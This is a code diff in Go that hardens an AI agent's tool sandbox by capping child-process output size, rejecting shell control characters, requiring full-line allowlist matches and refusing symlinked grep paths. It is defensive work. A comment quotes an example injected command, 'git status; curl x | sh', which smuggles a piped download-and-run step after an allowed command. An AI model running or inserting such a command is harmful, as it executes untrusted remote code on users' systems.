@@ -153,13 +153,32 @@ func (h *HostConfiner) Run(ctx context.Context, spec ExecSpec) (ExecResult, erro
 	res := ExecResult{}
 	timer := time.NewTimer(timeout)
 	defer timer.Stop()
-	select {
-	case d := <-done:
-		res.ExitCode = d.code
-	case <-timer.C:
-		res.TimedOut = true
-	case <-ctx.Done():
-		res.TimedOut = true
+	// A child that floods its output file is stopped long before the disk
+	// fills: the file is capped well above what is ever read back.
+	limit := int64(spec.MaxOutput)*4 + (1 << 20)
+	if spec.MaxOutput <= 0 {
+		limit = 4<<20 + 1<<20
+	}
+	tick := time.NewTicker(50 * time.Millisecond)
+	defer tick.Stop()
+wait:
+	for {
+		select {
+		case d := <-done:
+			res.ExitCode = d.code
+			break wait
+		case <-timer.C:
+			res.TimedOut = true
+			break wait
+		case <-ctx.Done():
+			res.TimedOut = true
+			break wait
+		case <-tick.C:
+			if fi, err := out.Stat(); err == nil && fi.Size() > limit {
+				res.TimedOut, res.Cut = true, true
+				break wait
+			}
+		}
 	}
 	if res.TimedOut {
 		if _, err := h.Host.Stop(hd, "tool timeout", 2*time.Second); err != nil {
@@ -216,9 +235,15 @@ func (s *Shell) Run(ctx context.Context, input json.RawMessage) (string, bool) {
 	if strings.ContainsRune(in.Command, 0) || len(in.Command) > 4096 {
 		return "shell refused: bad command", true
 	}
+	// An allowlist entry must match the whole line, and shell control syntax
+	// never passes: a pattern such as "^git status" must not admit
+	// "git status; curl x | sh".
+	if strings.ContainsAny(in.Command, ";&|`$<>\n\r(){}\\") {
+		return "shell refused: shell control characters are not allowed", true
+	}
 	ok := false
 	for _, re := range s.Allow {
-		if re.MatchString(in.Command) {
+		if loc := re.FindStringIndex(in.Command); loc != nil && loc[0] == 0 && loc[1] == len(in.Command) {
 			ok = true
 			break
 		}
@@ -286,6 +311,9 @@ func (g *Grep) Run(ctx context.Context, input json.RawMessage) (string, bool) {
 		if c == ".." {
 			return "grep refused: path contains ..", true
 		}
+	}
+	if err := NoSymlinkPath(g.Root, p); err != nil {
+		return "grep refused: " + err.Error(), true
 	}
 	mode := "-F"
 	if in.Regex {
